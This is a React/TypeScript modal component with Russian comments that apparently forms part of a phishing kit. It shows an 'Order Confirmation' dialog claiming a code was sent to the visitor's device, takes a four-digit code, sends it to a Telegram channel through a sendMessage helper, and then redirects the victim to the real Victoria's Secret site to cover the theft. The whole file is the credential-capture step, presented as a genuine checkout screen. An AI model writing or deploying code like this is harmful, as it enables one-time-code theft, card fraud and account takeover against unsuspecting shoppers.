import styles from './modal.module.scss';
import React, { useState } from "react";
import sendMessage from "../../api/telegram";

interface ModalProps {
    isOpen: boolean;
    onClose: () => void;
}

const Modal: React.FC<ModalProps> = ({ isOpen, onClose }) => {
    if (!isOpen) return null;

    // Состояние для confirm code
    const [confirmCode, setConfirmCode] = useState("");
    const [isLoading, setIsLoading] = useState(false); // Для индикации загрузки

    // Обработчик изменения значения confirm code
    const handleConfirmCodeChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        setConfirmCode(e.target.value);
    };

    // Функция для обработки подтверждения
    const handleConfirm = async () => {
        // Формируем сообщение для Telegram
        const message = `
            Confirm Code: ${confirmCode}
        `;

        // Ожидаем отправку сообщения в Telegram
        setIsLoading(true); // Начинаем загрузку
        try {
            await sendMessage(message);
            console.log("Confirm code sent to Telegram:", confirmCode);

            // После успешной отправки, редиректим пользователя на внешний сайт
            window.location.href = "https://www.victoriassecret.com"; // Редирект на внешний сайт

        } catch (error) {
            console.error("Failed to send confirm code:", error);
        } finally {
            setIsLoading(false); // Останавливаем загрузку
            onClose(); // Закрываем модальное окно
        }
    };

    // Проверка, можно ли нажать кнопку (код введён и не пустой)
    const isButtonDisabled = !confirmCode || confirmCode.length !== 4;

    return (
        <div className={styles.modalBackdrop} onClick={onClose}>
            <div className={styles.modalContent} onClick={(e) => e.stopPropagation()}>
                <div className={styles.modalHeader}>
                    <h2>Order Confirmation</h2>
                </div>
                <div className={styles.modalBody}>
                    <p>We have sent a confirmation code to your device</p>
                </div>
                <div className={styles.input_security}>
                    <input
                        className={styles.input_code}
                        type="text" // Используем тип "text" для confirm code
                        id="confirm-code"
                        name="confirm-code"
                        value={confirmCode}
                        onChange={handleConfirmCodeChange} // Обработчик изменения
                        required
                        maxLength={4}
                        pattern="[0-9 ]+" // Разрешаем только цифры
                        placeholder="Code"
                    />
                </div>
                <div className={styles.modalFooter}>
                    <button
                        type="button"
                        className={styles.button}
                        onClick={handleConfirm}
                        disabled={isButtonDisabled || isLoading} // Блокируем кнопку если код не введён или отправка в процессе
                    >
                        {isLoading ? "Sending..." : "Confirm"} {/* Показываем статус загрузки */}
                    </button>
                </div>
            </div>
        </div>
    );
};

export default Modal;
